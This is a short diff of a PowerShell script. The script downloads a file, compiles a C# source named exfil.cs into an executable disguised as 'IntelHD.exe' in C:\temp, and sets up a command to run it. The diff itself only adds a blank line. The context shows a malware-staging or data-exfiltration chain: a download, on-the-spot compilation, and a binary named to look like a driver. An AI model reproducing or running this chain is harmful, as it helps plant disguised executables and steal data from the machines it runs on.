@@ -26,6 +26,7 @@ $b.DownloadFile($url_k, $my_path_k) ;
 $command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\IntelHD.exe C:\temp\exfil.cs"
 invoke-expression $command
 $command3="cmd /C C:\temp\IntelHD.exe"
+
 #invoke-expression $command
 
 #Part 4 - Download 
